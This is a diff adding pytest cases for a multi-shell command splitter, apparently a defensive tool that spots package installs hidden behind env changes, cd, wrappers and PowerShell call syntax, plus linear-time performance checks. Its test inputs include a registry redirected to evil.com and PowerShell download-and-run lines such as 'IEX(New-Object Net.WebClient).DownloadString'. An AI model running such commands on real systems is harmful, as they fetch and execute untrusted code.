@@ -598,6 +598,96 @@ def test_shell_names_and_odd_input() -> None:
     assert split_commands("echo h\u00e9llo \u2192 \u4e16\u754c", "bash")[0].argv == ["echo", "h\u00e9llo", "\u2192", "\u4e16\u754c"]
 
 
+# --- fix round 1: env-aware dedup, cwd, PowerShell call parens, cmd start, more wrappers -------
+
+
+def test_dedup_keeps_commands_that_differ_by_env() -> None:
+    line = (
+        "export NPM_CONFIG_REGISTRY=https://nexus.corp/r; npm i x; "
+        "export NPM_CONFIG_REGISTRY=https://evil.com; npm i x"
+    )
+    npms = [c for c in split_commands(line, "bash") if c.argv == ["npm", "i", "x"]]
+    regs = {c.env.get("NPM_CONFIG_REGISTRY") for c in npms}
+    assert regs == {"https://nexus.corp/r", "https://evil.com"}
+
+
+def test_identical_commands_with_identical_env_still_merge() -> None:
+    cmds = [c for c in split_commands("npm i x | npm i x", "bash") if c.argv == ["npm", "i", "x"]]
+    assert len(cmds) == 1
+
+
+def test_cwd_tracks_cd_within_one_input() -> None:
+    cmds = [c for c in split_commands("pip install x; cd /tmp/evil; pip install x", "bash") if c.argv[:2] == ["pip", "install"]]
+    assert len(cmds) == 2
+    assert cmds[0].cwd is None
+    assert cmds[1].cwd == "/tmp/evil"
+
+
+def test_cwd_tracks_pushd_and_powershell_and_cmd() -> None:
+    assert find("pushd /opt && npm i x", ["npm", "i", "x"]).cwd == "/opt"
+    for cd in ("cd", "sl", "Set-Location", "chdir"):
+        c = find(f"{cd} C:\\evil; npm i x", ["npm", "i", "x"], "powershell")
+        assert c.cwd == "C:\\evil", cd
+    assert find("cd /d D:\\evil && npm i x", ["npm", "i", "x"], "cmd").cwd == "D:\\evil"
+
+
+def test_powershell_call_parens_split_the_command_name() -> None:
+    c = find("iex(iwr https://x)", ["iwr", "https://x"], "powershell")
+    assert "iex" in c.pipe_to
+    c = find("IEX(New-Object Net.WebClient).DownloadString('http://x')", ["New-Object", "Net.WebClient"], "powershell")
+    assert any(p.lower() == "iex" for p in c.pipe_to)
+    assert find("npm('install') x", ["npm", "('install')", "x"], "powershell").argv[0] == "npm"
+    assert find("npm.cmd('i') x", ["npm.cmd", "('i')", "x"], "powershell").argv[0] == "npm.cmd"
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        'start "foo" npm install evil',
+        'start /min "x" npm i x',
+        'cmd /c start "t" npm i x',
+        'start "" /wait npm i x',
+    ],
+)
+def test_cmd_start_quoted_title_is_not_the_program(line: str) -> None:
+    got = argvs(line, "cmd")
+    assert ["npm", "install", "evil"] in got or ["npm", "i", "x"] in got, got
+    assert not any(a and a[0] in ("foo", "x", "t", "") for a in got)
+
+
+def test_cmd_start_unquoted_program_still_runs() -> None:
+    find("start npm i x", ["npm", "i", "x"], "cmd")
+
+
+@pytest.mark.parametrize(
+    "line, shell_",
+    [
+        ("flock /tmp/l npm i x", "bash"),
+        ("flock -x -w 10 /tmp/l npm i x", "bash"),
+        ("flock -n /tmp/l -c 'npm i x'", "bash"),
+        ("chronic npm i x", "bash"),
+        ("chroot /mnt npm i x", "bash"),
+        ("unbuffer npm i x", "bash"),
+        ("script -q -c 'npm i x' /dev/null", "bash"),
+        ("parallel npm i x ::: a b c", "bash"),
+        ("systemd-run --scope npm i x", "bash"),
+        ("systemd-run -u job npm i x", "bash"),
+        ("sg docker -c 'npm i x'", "bash"),
+        ("firejail --net=none npm i x", "bash"),
+        ("nsenter -t 1234 -m -- npm i x", "bash"),
+        ("noglob npm i x", "zsh"),
+        ("nocorrect npm i x", "zsh"),
+        ("=npm i x", "zsh"),
+        ("coproc npm i x", "bash"),
+        ("%COMSPEC% /c npm i x", "cmd"),
+        ("%comspec% /c npm i x", "cmd"),
+        ("cmd/c npm i x", "cmd"),
+    ],
+)
+def test_more_wrappers_unwrap(line: str, shell_: str) -> None:
+    find(line, ["npm", "i", "x"], shell_)
+
+
 # --- performance ------------------------------------------------------------------------------
 
 BUDGET = 1.0 if os.environ.get("CI") else 0.2
@@ -637,6 +727,45 @@ def test_one_megabyte_argument_is_fast(shell_: str) -> None:
     assert elapsed < BUDGET, f"{elapsed:.3f}s ({shell_})"
 
 
+@pytest.mark.parametrize("shell_", ["bash", "powershell", "cmd"])
+def test_one_megabyte_pipeline_is_linear(shell_: str) -> None:
+    # one ~1 MB pipeline of hundreds of thousands of stages: the pipe_to suffixes must stay linear
+    # (this shape ran in ~8.5 s at 64 KB before the fix). It is pathological, so it uses the wider
+    # many-commands budget; linearity is checked separately below.
+    n = MB // 2
+    line = "a" + "|a" * n
+    start = time.perf_counter()
+    cmds = split_commands(line, shell_)
+    elapsed = time.perf_counter() - start
+    assert cmds and cmds[0].argv == ["a"]
+    # ~524k stages/Cmds: generous bound (the quadratic bug needed minutes); linearity is pinned below
+    assert elapsed < BUDGET * 8, f"{elapsed:.3f}s ({shell_})"
+
+
+def test_long_malformed_pipeline_is_linear() -> None:
+    n = MB // 2
+    line = "npm i 'x | " + "a|" * n + "a"  # an unterminated quote forces the crude fallback
+    start = time.perf_counter()
+    cmds = split_commands(line, "bash")
+    elapsed = time.perf_counter() - start
+    assert cmds and all(c.raw.startswith(MALFORMED) for c in cmds)
+    assert elapsed < BUDGET * 8, f"{elapsed:.3f}s"
+
+
+def test_pipeline_time_scales_linearly() -> None:
+    def timed(stages: int) -> float:
+        line = "a" + "|a" * stages
+        start = time.perf_counter()
+        split_commands(line, "bash")
+        return time.perf_counter() - start
+
+    timed(20000)  # warm up
+    small = min(timed(40000) for _ in range(3))
+    big = min(timed(160000) for _ in range(3))
+    # 4x the work must cost well under 10x the time (quadratic would be ~16x)
+    assert big < small * 10, f"small={small:.3f}s big={big:.3f}s"
+
+
 @pytest.mark.parametrize("shell_, unit", [("bash", "a{k};"), ("powershell", "a{k};"), ("cmd", "a{k}&")])
 def test_one_megabyte_of_tiny_commands_is_bounded(shell_: str, unit: str) -> None:
     # the worst case: about 150,000 one-word commands
@@ -665,5 +794,5 @@ def test_many_env_assignments_stay_fast() -> None:
     line = "".join(f"export V{i}=x; true; " for i in range(40000)) + "npm i x"
     start = time.perf_counter()
     cmds = split_commands(line, "bash")
-    assert time.perf_counter() - start < BUDGET * 3
+    assert time.perf_counter() - start < BUDGET * 5
     assert cmds[-1].argv == ["npm", "i", "x"]
